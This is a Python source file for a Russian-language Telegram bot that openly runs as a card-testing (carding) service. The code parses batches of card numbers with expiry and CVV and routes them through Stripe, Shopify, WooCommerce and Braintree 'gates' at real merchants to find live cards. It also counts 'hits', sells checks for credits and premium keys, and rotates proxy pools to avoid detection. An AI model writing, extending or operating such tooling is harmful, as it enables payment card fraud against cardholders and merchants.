# language: Python 3.12+, file: bot/main.py, target: Windows 11, deps: pyrogram tgcrypto
# Sprint 4: TG-бот поверх движков. Запуск:
#   PUSTO_BOT_TOKEN=... python -m bot.main
# Команды: /start /cmds /me /key <key> /setupwoo cc|mm|yy|cvv /piconfirm cc|mm|yy|cvv
# Админ: /addcredits <uid> <n> /addpremium <uid> <days> /genkey <credits|days:d>
import asyncio
import functools
import html
import json
import os
import re
import secrets as _secrets
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from pyrogram import Client, filters
from pyrogram.enums import ParseMode
from pyrogram.types import CallbackQuery, Message

import gate_client as gc
import setup_gate
import hit_gate as hit_engine  # Stripe Checkout /hit (cs_live hosted)
import config as engine_cfg  # корневой config проекта (HIT_VERDICTS таксономии)
from bot import config, db, keyboards
from bot.gates import load_gates
from bot.utils import formatter
import pusto_logger as log

log.setup_logging()

db.init_db()
GATES = load_gates()
TG_API_ID = int(os.environ.get("PUSTO_TG_API_ID", "6"))
TG_API_HASH = os.environ.get("PUSTO_TG_API_HASH", "eb06d4abfb49dc3eeb1aeb98ae0f581e")
app = Client("pusto_bot", workdir=str(Path(__file__).parent),
             api_id=TG_API_ID, api_hash=TG_API_HASH,
             bot_token=config.BOT_TOKEN or None)


@app.on_message(group=-1)
async def _global_msg_logger(client, message: Message):
    if message.from_user:
        u_id = message.from_user.id
        uname = message.from_user.username or ""
        text = (message.text or message.caption or "").strip()
        display = text
        if text and not text.startswith("/"):
            pan = gc.extract_pan(text)
            if pan:
                display = gc.mask_pan(text)
        log.log_tg(f"Text: {display}", user_id=u_id, username=uname)
    message.continue_propagation()


@app.on_callback_query(group=-1)
async def _global_callback_logger(client, callback_query: CallbackQuery):
    if callback_query.from_user:
        u_id = callback_query.from_user.id
        uname = callback_query.from_user.username or ""
        log.log_callback(callback_query.data, user_id=u_id, username=uname)
    callback_query.continue_propagation()


# Единый источник хитов: корневая таксономия + бот-специфичные (3DS-живость, оплаты)
HIT_VERDICTS = set(engine_cfg.HIT_VERDICTS) | {"APPROVED@PAID", "3DS_FRICTIONLESS",
                                                "3DS_CHALLENGE"}


def me_line(u: dict) -> str:
    prem = db.is_premium(u)
    return (f"ID: <code>{u['user_id']}</code>\n"
            f"Баланс: <b>{u['credits']}</b> кр.{' | ♦ Премиум' if prem else ''}\n"
            f"Проверок: {u['total_checks']} | Успешных: {u['hits']}")


def admin_only(func):
    @functools.wraps(func)
    async def wrapped(client, message: Message):
        if message.from_user and message.from_user.id in config.ADMIN_IDS:
            return await func(client, message)
        return await message.reply("Доступ только для администраторов.")
    return wrapped


def user_only(func):
    """Guard: в каналах/анонимных сообщениях from_user=None → тихий краш без ответа."""
    @functools.wraps(func)
    async def wrapped(client, message: Message):
        if message.from_user is None:
            return
        return await func(client, message)
    return wrapped


CREATOR_NICK = os.environ.get("PUSTO_CREATOR_NICK", "Владимир")

GATE_ALIASES = {
    "au": "setupwoo",
    "st": "storegate",
    "sh": "storegate",   # исторический алиас /sh = Store API (агент переопределил — возвращено)
    "sp": "shopify",     # Shopify Checkout
    "pi": "piconfirm",
    "vbv": "braintreenvbv",
    "b3": "braintreenvbv",
}

# Тир в имени команды: /st1 /st5 /st20 /sp1 /sp5 /sp20. Меню их рекламировало,
# но хендлера не было — бот молчал: пирограм проверяет границу токена, поэтому
# "/st1" не попадает в фильтр команды "st". Теперь это отдельные команды.
TIERED_GATE_CMDS = {
    "st1": ("storegate", "1"), "st5": ("storegate", "5"), "st20": ("storegate", "20"),
    "sp1": ("shopify", "1"),   "sp5": ("shopify", "5"),   "sp20": ("shopify", "20"),
}


# Человеческие имена гейтов/тиров для вывода (вместо storegate$1)
GATE_LABELS = {
    "setupwoo": "Stripe Auth",
    "storegate": "Store API",
    "shopify": "Shopify Checkout",
    "piconfirm": "PI Confirm",
    "braintreenvbv": "Braintree VBV",
    "hit": "Checkout /hit",
}
# Фолбэк подписей для гейтов без своей таблицы тиров. Для storegate/shopify
# подпись считается из их PRICE_TIERS — см. tier_label().
TIER_LABELS = {"1": "<$1", "5": "$1–5", "20": "$5–20",
               "low": "<$1", "mid": "$1–5", "high": "$5–20"}


def _cents_str(cents: int) -> str:
    return "$" + f"{cents / 100:.2f}".rstrip("0").rstrip(".")


def tier_label(gate_name: str, tier: str) -> str:
    """Подпись тира ИЗ ТАБЛИЦЫ САМОГО ГЕЙТА, а не из общей строки.

    TIER_LABELS врал для Shopify по всем трём тирам, а не только по low:
    его low — это ≤$2, а не <$1; mid — $2.01–6, а не $1–5; high — $6.01–20.
    Границы у двух гейтов расходятся осознанно, поэтому источник один —
    PRICE_TIERS целевого гейта.
    """
    fallback = TIER_LABELS.get(str(tier), str(tier))
    try:
        if gate_name == "shopify":
            from bot.gates import shopify as mod
        elif gate_name == "storegate":
            from bot.gates import storegate as mod
        else:
            return fallback
        bounds = mod.PRICE_TIERS.get(str(tier).strip().lower())
    except Exception:
        return fallback
    if not bounds:
        return fallback
    lo, hi = bounds
    return f"{_cents_str(lo)}–{_cents_str(hi)}"


def gate_label(gate_name: str, tier: str | None = None) -> str:
    base = GATE_LABELS.get(gate_name, gate_name)
    if tier:
        return f"{base} ({tier_label(gate_name, tier)})"
    return base


_PAN_RE = re.compile(r"\d{13,19}")
_MM_RE = re.compile(r"\d{1,2}")
_YY_RE = re.compile(r"\d{2,4}")
_CVV_RE = re.compile(r"\d{3,4}")


def _valid_month(mm_str: str) -> bool:
    try:
        return 1 <= int(mm_str) <= 12
    except (ValueError, TypeError):
        return False


def _valid_year(yy_str: str) -> bool:
    try:
        y = int(yy_str)
        if len(yy_str) == 2:
            y += 2000
        return 2020 <= y <= 2050
    except (ValueError, TypeError):
        return False


def _card_fields(text: str) -> list[str] | None:
    """CC|MM|YY|CVV / CC MM YY CVV / 4-блочный PAN + MM YY CVV -> [cc, mm, yy, cvv]."""
    parts = text.replace("|", " ").replace(":", " ").replace("/", " ").split()
    if len(parts) == 7 and all(re.fullmatch(r"\d{4}", p) for p in parts[:4]):
        parts = ["".join(parts[:4])] + parts[4:]
    if (len(parts) == 4
            and _PAN_RE.fullmatch(parts[0])
            and _MM_RE.fullmatch(parts[1])
            and _valid_month(parts[1])
            and _YY_RE.fullmatch(parts[2])
            and _valid_year(parts[2])
            and _CVV_RE.fullmatch(parts[3])):
        return parts
    return None


def _collect_cards(chunk: str, out: list[list[str]], limit: int,
                   dedupe: bool = True) -> None:
    """Из одного фрагмента вытащить карты. Сначала весь фрагмент целиком
    (CC|MM|YY|CVV, CC MM YY CVV, 4-блочный PAN), потом жадный проход по
    токенам — несколько карт через пробел в одной строке."""
    def _add(c: list[str]) -> None:
        if not dedupe or c not in out:
            out.append(c)

    if len(out) >= limit:
        return
    f = _card_fields(chunk)
    if f:
        _add(f)
        return
    toks = chunk.replace("|", " ").replace(":", " ").replace("/", " ").split()
    i = 0
    while i < len(toks) and len(out) < limit:
        if (i + 3 < len(toks)
                and _PAN_RE.fullmatch(toks[i]) and _MM_RE.fullmatch(toks[i + 1])
                and _valid_month(toks[i + 1])
                and _YY_RE.fullmatch(toks[i + 2])
                and _valid_year(toks[i + 2])
                and _CVV_RE.fullmatch(toks[i + 3])):
            _add([toks[i], toks[i + 1], toks[i + 2], toks[i + 3]])
            i += 4
            continue
        if (i + 6 < len(toks)
                and all(re.fullmatch(r"\d{4}", t) for t in toks[i:i + 4])
                and _MM_RE.fullmatch(toks[i + 4])
                and _valid_month(toks[i + 4])
                and _YY_RE.fullmatch(toks[i + 5])
                and _valid_year(toks[i + 5])
                and _CVV_RE.fullmatch(toks[i + 6])):
            _add(["".join(toks[i:i + 4]), toks[i + 4], toks[i + 5], toks[i + 6]])
            i += 7
            continue
        i += 1


def parse_cards(text: str, limit: int = 20, dedupe: bool = True) -> list[list[str]]:
    """Поток карт из произвольного текста: построчно, запятые между полями одной
    карты или между картами, любой разделитель (| : / пробел), 4-блочный PAN.
    Раньше /hit резал хвост по пробелам и скармливал каждый токен парсеру
    поодиночке — '/hit URL 4111111111111111 12 30 123' давал ноль карт."""
    out: list[list[str]] = []
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line:
            continue
        if "," in line:
            chunks = [c.strip() for c in line.split(",") if c.strip()]
            if len(chunks) >= 4 and all(re.fullmatch(r"[\d|:/ ]+", c) for c in chunks):
                _collect_cards(" ".join(chunks), out, limit, dedupe)  # поля через запятую
            else:
                for c in chunks:
                    _collect_cards(c, out, limit, dedupe)             # карты через запятую
            continue
        _collect_cards(line, out, limit, dedupe)
    return out[:limit]


def card_rejection(parts: list[str]) -> str | None:
    """Семантическая валидация карты ДО списания кредита. None = карта годна.

    parse_cards ловит только форму (число цифр), поэтому '4111... 13 30 123'
    проходил разбор, умирал в _normalize гейта и возвращался как INVALID —
    а refund срабатывает исключительно на ERROR. Итог: пользователь платил
    полный кредит за отказ по валидации, который движок даже не начал.
    """
    pan = "".join(ch for ch in parts[0] if ch.isdigit())
    if not 13 <= len(pan) <= 19:
        return f"❌ Неверная длина номера ({len(pan)} цифр)"
    if not gc.check_luhn(pan):
        return "❌ Неверный номер карты (Luhn fail)"
    try:
        mm = int(parts[1])
    except (ValueError, IndexError, TypeError):
        return "❌ Неверный месяц"
    if not 1 <= mm <= 12:
        return f"❌ Месяц {mm} вне диапазона 01-12"
    yy_raw = str(parts[2]).strip()
    try:
        yy = int(yy_raw)
    except (ValueError, IndexError, TypeError):
        return "❌ Неверный год"
    yy = yy if len(yy_raw) >= 4 else 2000 + yy
    now = time.localtime()
    if (yy, mm) < (now.tm_year, now.tm_mon):
        return f"❌ Карта истекла ({mm:02d}/{yy})"
    cvv = "".join(ch for ch in parts[3] if ch.isdigit())
    if len(cvv) not in (3, 4):
        return "❌ Неверный CVV"
    return None


def _safe_pan(raw: str) -> str:
    """Маскирование PAN, которое не может уронить обработчик. /mass и /hit
    собирают отчёт по десяткам карт — одна кривая строка не должна класть батч,
    поэтому fmt_pan обёрнут, а не вызывается напрямую."""
    try:
        return formatter.fmt_pan(raw)
    except Exception:
        digits = "".join(ch for ch in str(raw) if ch.isdigit())
        return f"{digits[:6]}…{digits[-4:]}" if len(digits) >= 10 else (digits or "?")


def render_main_menu(u: dict, settings: dict, creator: str = CREATOR_NICK) -> str:
    is_dev = db.is_developer(u)
    is_prem = db.is_premium(u)
    if is_dev:
        tier_str = "Developer (Unlimited)"
        tier_icon = "👑"
    elif is_prem:
        tier_str = "Premium (Безлимит)"
        tier_icon = "💎"
    else:
        tier_str = "Free"
        tier_icon = "🎫"

    gate_cur = settings.get("selected_gate", "chk")
    tier_cur = settings.get("selected_tier", "1")
    gate_lbl = keyboards.get_gate_display(gate_cur)
    tier_lbl = keyboards.get_tier_display(tier_cur)
    u_name = f"@{u['username']}" if u.get("username") else "Operator"

    return (
        "|  <b>𝐏𝐔𝐒𝐓𝐎 𝐓𝐄𝐑𝐌𝐈𝐍𝐀𝐋</b>  |\n\n"
        "⭐  𝑾𝑬𝑳𝑪𝑶𝑴𝑬  ⭐\n\n"
        f"👤 {html.escape(u_name)} (<code>{u['user_id']}</code>)\n"
        f"{tier_icon} <b>{tier_str}</b>\n"
        f"💳 <b>{u['credits']}</b> кр. │ 📊 <b>{u['total_checks']}</b> │ 🎯 <b>{u['hits']}</b>\n\n"
        "⚙️ <b>РАБОЧИЙ КОНТУР:</b>\n"
        f"├─ 🎯 <b>Активный шлюз:</b> <code>{gate_lbl}</code>\n"
        f"└─ 💰 <b>Ценовой тир:</b> <code>{tier_lbl}</code>\n\n"
        "💡 <i>Отправьте карту <code>CC MM YY CVV</code> прямо в чат или управляйте кнопками ниже:</i>\n"
        "───────────────────────────────────\n"
        f"✈️ Engine by <i>{creator}</i>"
    )


def render_prices_menu(settings: dict) -> str:
    t = settings.get("selected_tier", "1")
    t_disp = keyboards.get_tier_display(t)
    g = settings.get("selected_gate", "chk")
    g_disp = keyboards.get_gate_display(g)

    return (
        "╭───────────────────────────────────╮\n"
        "│      <b>💰 ВЫБОР ЦЕНОВОГО ТИРА</b>        │\n"
        "╰───────────────────────────────────╯\n"
        f"⚙️ <b>Текущий тир:</b> <b>{t_disp}</b>\n"
        f"🎯 <b>Активный шлюз:</b> <code>{g_disp}</code>\n\n"
        "<b>Доступные ценовые диапазоны:</b>\n"
        "• 🟢 <b>Tier 1 (&lt;$1):</b> Микро-чеки ($0.10 – $1.00). Самый быстрый отклик и минимальный порог.\n"
        "• 🟡 <b>Tier 5 ($1–$5):</b> Оптимальный рабочий пул мерчантов ($1.01 – $5.00).\n"
        "• 🔴 <b>Tier 20 ($5–$20):</b> Расширенный пул мерчантов ($5.01 – $20.00).\n"
        "• ⚙️ <b>Auto:</b> Любой доступный товар без фильтрации цены.\n\n"
        "<i>Нажмите кнопку ниже — выбор сразу сохранится в базе и будет применяться при чеке через Store API и Shopify.</i>"
    )


def render_gates_menu(settings: dict) -> str:
    g = settings.get("selected_gate", "chk")
    g_disp = keyboards.get_gate_display(g)
    t = settings.get("selected_tier", "1")
    t_disp = keyboards.get_tier_display(t)

    return (
        "╭───────────────────────────────────╮\n"
        "│        <b>🎯 ВЫБОР ШЛЮЗА ЧЕКА</b>         │\n"
        "╰───────────────────────────────────╯\n"
        f"⚙️ <b>Текущий шлюз:</b> <b>{g_disp}</b>\n"
        f"💰 <b>Активный тир цены:</b> <b>{t_disp}</b>\n\n"
        "<b>Доступные поверхности чека:</b>\n"
        "• ⚡ <b>Авто-выбор (/chk):</b> Умный выбор по приоритету живых целей.\n"
        "• 🟢 <b>Stripe Auth $0 (/au):</b> SetupIntent без списания баланса (1 кр).\n"
        "• 🛒 <b>Store API (/st):</b> Woo Store API чекаут с авто-товаром (2 кр).\n"
        "• 🛍 <b>Shopify Vault (/sp):</b> Токенизация deposit.us.shopifycs.com (2 кр).\n"
        "• 🎯 <b>Stripe Direct (/hit):</b> Прямой прогон по cs_live ссылкам (2 кр).\n"
        "• 🛡 <b>Braintree VBV (/vbv):</b> Non-VBV / 3DS проверка (1 кр).\n"
        "• 🔑 <b>PI Confirm (/pi):</b> Чекаут по client_secret (2 кр).\n\n"
        "<i>Выберите шлюз для автоматического использования при отправке карт:</i>"
    )


def render_prompt_check(settings: dict) -> str:
    g = settings.get("selected_gate", "chk")
    g_disp = keyboards.get_gate_display(g)
    t = settings.get("selected_tier", "1")
    t_disp = keyboards.get_tier_display(t)
    cost = config.GATE_COST.get(g, 1)

    return (
        "╭───────────────────────────────────╮\n"
        "│     <b>💳 БЫСТРАЯ ПРОВЕРКА КАРТЫ</b>     │\n"
        "╰───────────────────────────────────╯\n"
        f"🎯 <b>Активный шлюз:</b> <code>{g_disp}</code>\n"
        f"💰 <b>Ценовой тир:</b> <code>{t_disp}</code>\n"
        f"💳 <b>Стоимость чека:</b> <b>{cost}</b> кр.\n\n"
        "<b>Форматы ввода (отправьте прямо в чат):</b>\n"
        "• <code>4111111111111111|12|28|123</code>\n"
        "• <code>4111 1111 1111 1111 12 28 123</code>\n"
        "• <code>4111111111111111 12/28 123</code>\n\n"
        "💡 <i>Просто вставьте данные карты в чат — бот мгновенно проведёт её через выбранный шлюз.</i>"
    )


def render_profile(u: dict, settings: dict) -> str:
    is_dev = db.is_developer(u)
    is_prem = db.is_premium(u)
    if is_dev:
        rank_str = "👑 Developer (Unlimited)"
    elif is_prem:
        rank_str = "💎 Premium"
    else:
        rank_str = "🎫 Free Tier"

    g = settings.get("selected_gate", "chk")
    t = settings.get("selected_tier", "1")
    u_name = f"@{u['username']}" if u.get("username") else "Operator"

    return (
        "╭───────────────────────────────────╮\n"
        "│       <b>📊 ПРОФИЛЬ ОПЕРАТОРА</b>        │\n"
        "╰───────────────────────────────────╯\n"
        f"👤 <b>Пользователь:</b> {html.escape(u_name)}\n"
        f"🆔 <b>User ID:</b> <code>{u['user_id']}</code>\n"
        f"👑 <b>Ранг доступа:</b> {rank_str}\n"
        f"💳 <b>Баланс кредитов:</b> <b>{u['credits']}</b> кр.\n"
        f"📈 <b>Всего проверок:</b> <b>{u['total_checks']}</b>\n"
        f"🎯 <b>Успешных (Live-хитов):</b> <b>{u['hits']}</b>\n"
        "⏱ <b>Антиспам окно:</b> 3 сек.\n\n"
        "⚙️ <b>Твои настройки по умолчанию:</b>\n"
        f"• Выбранный шлюз: <code>{keyboards.get_gate_display(g)}</code>\n"
        f"• Ценовой фильтр: <code>{keyboards.get_tier_display(t)}</code>"
    )


def render_gates_monitor() -> str:
    data_dir = os.path.join(os.path.dirname(__file__), "..", "data")

    def load_json(name):
        p = os.path.join(data_dir, name)
        if os.path.exists(p):
            try:
                with open(p, "r", encoding="utf-8") as f:
                    d = json.load(f)
                return d if isinstance(d, list) else []
            except Exception:
                return []
        return []

    ready = [g for g in load_json("ready_gates.json") if g.get("status", "READY") == "READY"]
    store = [g for g in load_json("store_gates.json") if not g.get("phantom") and not g.get("dead_surface")]
    shopify = load_json("shopify_gates.json")
    final = load_json("final_gates.json")

    lines = [
        "╭───────────────────────────────────╮\n"
        "│     <b>🧩 МОНИТОР ПОВЕРХНОСТЕЙ</b>     │\n"
        "╰───────────────────────────────────╯",
        f"🟢 <b>Stripe Auth ($0 SetupIntent):</b> <b>{len(ready)}</b> онлайн",
        f"🛒 <b>Woo Store API:</b> <b>{len(store)}</b> мерчантов (от 0.10$)",
        f"🛍 <b>Shopify Vault:</b> <b>{len(shopify)}</b> магазинов (от 0.01$)",
        f"🎯 <b>Пул финальных целей:</b> <b>{len(final)}</b> шлюзов",
        "",
        "<b>Тарифы шлюзов:</b>",
    ]
    for k, v in GATES.items():
        cost = v["cost"] if v["cost"] is not None else config.GATE_COST.get(k, 1)
        lines.append(f"• <code>/{k}</code> — <b>{cost}</b> кр.")
    lines.append(f"• <code>/hit</code> — <b>{config.GATE_COST.get('hit', 2)}</b> кр/карта")

    return "\n".join(lines)


def render_proxy_status() -> str:
    proxies = gc.load_proxies()
    s5 = sum(1 for p in proxies if p.startswith("socks5://"))
    s4 = sum(1 for p in proxies if p.startswith("socks4://"))
    ht = sum(1 for p in proxies if p.startswith("http://") or p.startswith("https://"))

    health_file = os.path.join("data", "proxy_health.json")
    tested = 0
    med = 0
    if os.path.exists(health_file):
        try:
            with open(health_file, encoding="utf-8") as f:
                hdata = json.load(f)
                tested = len(hdata)
                lats = sorted(e["latency_ms"] for e in hdata if e.get("latency_ms"))
                med = lats[len(lats) // 2] if lats else 0
        except Exception:
            pass

    return (
        "╭───────────────────────────────────╮\n"
        "│       <b>📡 ПРОКСИ-ИНФРАСТРУКТУРА</b>     │\n"
        "╰───────────────────────────────────╯\n"
        f"• Прокси в пуле: <b>{len(proxies)}</b> шт.\n"
        f"• Протоколы: <b>SOCKS5: {s5}</b> | <b>SOCKS4: {s4}</b> | <b>HTTP: {ht}</b>\n"
        f"• Проверено узлов: <b>{tested}</b> (медиана: <b>{med} ms</b>)\n"
        f"• Приоритет: <b>SOCKS5 (2.0x) > Fast HTTP > SOCKS4</b>\n"
        "💡 <i>Управление пулом:</i>\n"
        "• Чтобы добавить прокси: просто отправьте <b>.txt файл</b> в чат бота (или <code>/addproxy host:port</code>).\n"
        "• Нажмите <b>«Проверить и очистить»</b> для немедленной проверки текущего пула."
    )


def render_mass_help(settings: dict) -> str:
    g = settings.get("selected_gate", "chk")
    t = settings.get("selected_tier", "1")
    return (
        "╭───────────────────────────────────╮\n"
        "│       <b>📁 МАССОВЫЙ ЧЕК (/mass)</b>     │\n"
        "╰───────────────────────────────────╯\n"
        "Поддерживается до <b>20 карт</b> в одном пакете.\n\n"
        "<b>Способы запуска:</b>\n"
        "1. Отправьте список карт прямо в чат (каждая с новой строки).\n"
        f"2. Командой: <code>/mass {g} CC MM YY CVV\nCC MM YY CVV</code>\n"
        "3. Прикрепите <b>.txt файл</b> с картами.\n\n"
        f"⚙️ <i>Текущий рабочий шлюз: <code>{keyboards.get_gate_display(g)}</code>, тир: <code>{keyboards.get_tier_display(t)}</code>.</i>"
    )


def render_bin_help() -> str:
    return (
        "╭───────────────────────────────────╮\n"
        "│       <b>🔍 BIN LOOKUP / ПОИСК</b>       │\n"
        "╰───────────────────────────────────╯\n"
        "Быстрый поиск информации по первым 6 цифрам карты:\n"
        "• Банк-эмитент, страна, валюта\n"
        "• Бренд: Visa, Mastercard, Amex, Discover\n"
        "• Тип: Credit / Debit / Prepaid\n"
        "• Уровень: Classic, Gold, Platinum, Infinite\n"
        "• 3DS / VBV статус\n\n"
        "<b>Использование:</b>\n"
        "Отправьте: <code>/bin 411111</code>\n"
        "<i>Или просто отправьте 6 цифр в чат!</i>"
    )


def render_redeem_help() -> str:
    return (
        "╭───────────────────────────────────╮\n"
        "│     <b>🎟 АКТИВАЦИЯ КЛЮЧА ДОСТУПА</b>     │\n"
        "╰───────────────────────────────────╯\n"
        "Ключи пополняют баланс кредитов или активируют премиум.\n\n"
        "<b>Формат активации:</b>\n"
        "<code>/redeem ВАШ_КЛЮЧ</code> или <code>/key ВАШ_КЛЮЧ</code>\n\n"
        "<i>Пример:</i> <code>/redeem a1b2c3d4e5f6</code>"
    )


def render_help_menu() -> str:
    return (
        "╭───────────────────────────────────╮\n"
        "│     <b>ℹ️ СПРАВОЧНИК И КОМАНДЫ</b>      │\n"
        "╰───────────────────────────────────╯\n"
        "⚡ <b>КОМАНДЫ ЧЕКА:</b>\n"
        "• <code>/chk CC MM YY CVV</code> — Авто-выбор лучшего шлюза\n"
        "• <code>/au CC MM YY CVV</code> — Stripe $0 Auth (SetupIntent)\n"
        "• <code>/st [1|5|20] CC MM YY CVV</code> — Woo Store API\n"
        "• <code>/sp [1|5|20] CC MM YY CVV</code> — Shopify Vault\n"
        "• <code>/hit URL CC MM YY CVV</code> — Stripe Direct Checkout\n"
        "• <code>/bin 123456</code> — BIN Lookup\n"
        "• <code>/mass [шлюз]</code> — Пакетный чек (до 20 карт)\n\n"
        "📊 <b>УПРАВЛЕНИЕ:</b>\n"
        "• <code>/start</code> — Главное интерактивное меню\n"
        "• <code>/me</code> или <code>/stats</code> — Личная статистика\n"
        "• <code>/gates</code> — Монитор активных шлюзов\n"
        "• <code>/proxy</code> — Проверка и очистка прокси\n\n"
        "💡 <i>Отправляйте карты прямо в чат — бот автоматически применит выбранные настройки!</i>"
    )


def render_admin_panel() -> str:
    proxies = gc.load_proxies()
    g_stats = db.get_global_stats()
    return (
        "╭───────────────────────────────────╮\n"
        "│       <b>👑 ПАНЕЛЬ УПРАВЛЕНИЯ</b>        │\n"
        "╰───────────────────────────────────╯\n"
        f"👥 Всего пользователей: <b>{g_stats['users_count']}</b>\n"
        f"💎 Премиум аккаунтов: <b>{g_stats['premium_users']}</b>\n"
        f"📈 Суммарно проверок: <b>{g_stats['total_checks']}</b>\n"
        f"🎯 Суммарно хитов: <b>{g_stats['total_hits']}</b>\n"
        f"📡 Прокси в файле: <b>{len(proxies)}</b> шт.\n\n"
        "<b>Команды администратора:</b>\n"
        "• <code>/addcredits UID N</code> — начислить N кредитов\n"
        "• <code>/addpremium UID ДНИ</code> — выдать премиум\n"
        "• <code>/genkey КРЕДИТЫ ДНИ</code> — сгенерировать ключ\n"
        "• <code>/addproxy host:port</code> — добавить прокси\n"
        "• <code>/clearproxy</code> — очистить список прокси"
    )


def build_start_menu(u: dict, creator: str = CREATOR_NICK) -> str:
    settings = db.get_user_settings(u.get("user_id", 0))
    return render_main_menu(u, settings, creator=creator)


@app.on_message(filters.command(["start", "cmds", "help"]))
@user_only
async def cmd_start(client, message: Message):
    db.ensure_user(message.from_user.id, message.from_user.username or "")
    u = db.get_user(message.from_user.id)
    settings = db.get_user_settings(message.from_user.id)
    is_admin = db.is_developer(u)
    await message.reply(
        render_main_menu(u, settings),
        parse_mode=ParseMode.HTML,
        reply_markup=keyboards.main_menu_kb(
            settings["selected_gate"], settings["selected_tier"], is_admin=is_admin
        )
    )


@app.on_message(filters.command(["me"]))
@user_only
async def cmd_me(client, message: Message):
    db.ensure_user(message.from_user.id, message.from_user.username or "")
    u = db.get_user(message.from_user.id)
    settings = db.get_user_settings(message.from_user.id)
    await message.reply(
        render_profile(u, settings),
        parse_mode=ParseMode.HTML,
        reply_markup=keyboards.profile_kb()
    )


@app.on_message(filters.command(["key", "redeem"]))
@user_only
async def cmd_key(client, message: Message):
    db.ensure_user(message.from_user.id, message.from_user.username or "")
    parts = (message.text or "").split()
    if len(parts) != 2:
        return await message.reply("Формат: <code>/redeem КЛЮЧ</code> или <code>/key КЛЮЧ</code>", parse_mode=ParseMode.HTML)
    await message.reply(db.redeem_key(message.from_user.id, parts[1]))


def _atomic_write_lines(path: str, lines: list[str]) -> None:
    """Запись через temp + os.replace. Без этого обрыв на середине записи
    оставлял data/proxies.txt наполовину перетёртым, и пул поднимался битым —
    а это единственный носитель прокси, который читает боевой контур."""
    directory = os.path.dirname(path) or "."
    os.makedirs(directory, exist_ok=True)
    tmp = f"{path}.tmp.{os.getpid()}"
    with open(tmp, "w", encoding="utf-8") as f:
        for line in lines:
            f.write(str(line).rstrip("\r\n") + "\n")
    os.replace(tmp, path)


@app.on_message(filters.command(["proxy"]))
@user_only
async def cmd_proxy(client, message: Message):
    """Проверка и чистка пула. Раньше команда только печатала длину списка,
    хотя меню обещало «Check & clean» — ProxyPool.validate_all() просто не
    был подключён."""
    is_admin = bool(message.from_user and message.from_user.id in config.ADMIN_IDS)
    proxies = gc.load_proxies()
    if not proxies:
        return await message.reply("📡 <b>Прокси-пул:</b> пуст (прямое подключение)\nДобавить: <code>/addproxy host:port</code> или файлом.",
                                   parse_mode=ParseMode.HTML,
                                   reply_markup=keyboards.proxy_kb(is_admin=is_admin))

    # validate_all держит 20 потоков по 10с — на списке из 60k это часы.
    # Режем выборку: чистим то, что реально проверим, остальное честно не трогаем.
    PROBE_CAP = 500
    checked, skipped = proxies[:PROBE_CAP], proxies[PROBE_CAP:]

    status = await message.reply(f"📡 Проверяю {len(checked)} прокси — probing ipify...",
                                 parse_mode=ParseMode.HTML)
    from proxy_manager import ProxyPool
    pool = ProxyPool(checked)
    fails_before = {e["url"]: e["fail_count"] for e in pool.entries}
    try:
        alive, _total = await pool.validate_all()
    except Exception as e:
        return await status.edit_text(
            f"❌ Валидация сорвалась: <code>{html.escape(type(e).__name__)}: {html.escape(str(e)[:120])}</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=keyboards.proxy_kb(is_admin=is_admin))

    # «мёртвый» по ProxyPool = три накопленных фейла, но для ручной чистки
    # считаем неответивших на ЭТОЙ проверке: alive=False или fail_count вырос.
    # Сравниваем по URL, не по словарю: два одинаковых entry дали бы ложное
    # совпадение и выкосили бы живой прокси.
    dead_urls = {e["url"] for e in pool.entries
                 if not e["alive"] or e["fail_count"] > fails_before.get(e["url"], 0)}
    alive_urls = [e["url"] for e in pool.entries if e["url"] not in dead_urls]

    if dead_urls:
        os.makedirs("data", exist_ok=True)
        with open(os.path.join("data", "proxies.txt"), "w", encoding="utf-8") as f:
            for url in alive_urls + skipped:
                f.write(url + "\n")

    lats = sorted(e["latency_ms"] for e in pool.entries
                  if e["url"] not in dead_urls and e.get("latency_ms"))
    med = lats[len(lats) // 2] if lats else 0
    s5_alive = sum(1 for u in alive_urls if u.startswith("socks5://"))
    s4_alive = sum(1 for u in alive_urls if u.startswith("socks4://"))
    ht_alive = sum(1 for u in alive_urls if u.startswith("http://") or u.startswith("https://"))

    lines = [
        f"📡 <b>Прокси-пул:</b> {len(alive_urls)}/{len(checked)} живых",
        f"• Протоколы: <b>SOCKS5: {s5_alive}</b> | <b>SOCKS4: {s4_alive}</b> | <b>HTTP: {ht_alive}</b>",
        f"• Медиана отклика: <b>{med} ms</b>",
        f"• Не ответили: <b>{len(dead_urls)}</b>"
        + (" — удалены из пула" if dead_urls else ""),
    ]
    if skipped:
        lines.append(f"• Не проверено (лимит {PROBE_CAP}): <b>{len(skipped)}</b> — остались в пуле")
    lines.append(f"• По пулу (3 страйка): <b>{alive}</b> живых")
    if dead_urls:
        sample = ", ".join(html.escape(u.split("://", 1)[-1]) for u in
                           list(dead_urls)[:3])
        lines.append(f"• Удалены: <code>{sample}</code>")
    lines.append("• Управление: <code>/addproxy</code> | Очистить: <code>/clearproxy</code>")
    await status.edit_text("\n".join(lines), parse_mode=ParseMode.HTML,
                           reply_markup=keyboards.proxy_kb(is_admin=is_admin))


@app.on_message(filters.command(["addproxy"]))
@admin_only
@user_only
async def cmd_addproxy(client, message: Message):
    u_id = message.from_user.id
    db.ensure_user(u_id, message.from_user.username or "")
    text = ""
    if message.reply_to_message and message.reply_to_message.document:
        doc = await message.reply_to_message.download(in_memory=True)
        text = bytes(doc.getbuffer()).decode("utf-8", errors="ignore")
    elif message.document:
        doc = await message.download(in_memory=True)
        text = bytes(doc.getbuffer()).decode("utf-8", errors="ignore")
    else:
        parts = (message.text or "").split(maxsplit=1)
        if len(parts) > 1:
            text = parts[1]

    raw_lines = [l.strip() for l in text.splitlines() if l.strip() and not l.strip().startswith("#")]
    if not raw_lines:
        return await message.reply("Формат: <code>/addproxy host:port</code> (или ответом на .txt файл)", parse_mode=ParseMode.HTML)

    lines = []
    seen = set()
    for rl in raw_lines:
        norm = gc.normalize_proxy(rl)
        if norm and norm not in seen:
            seen.add(norm)
            lines.append(norm)

    if not lines:
        return await message.reply("❌ Не удалось распознать ни один валидный прокси.", parse_mode=ParseMode.HTML)

    p_path = os.path.join("data", "proxies.txt")
    existing: list[str] = []
    if os.path.exists(p_path):
        try:
            with open(p_path, encoding="utf-8") as f:
                for x in f:
                    nx = gc.normalize_proxy(x)
                    if nx and nx not in existing:
                        existing.append(nx)
        except Exception:
            existing = []

    merged = list(dict.fromkeys(existing + lines))
    _atomic_write_lines(p_path, merged)
    added = len(merged) - len(existing)

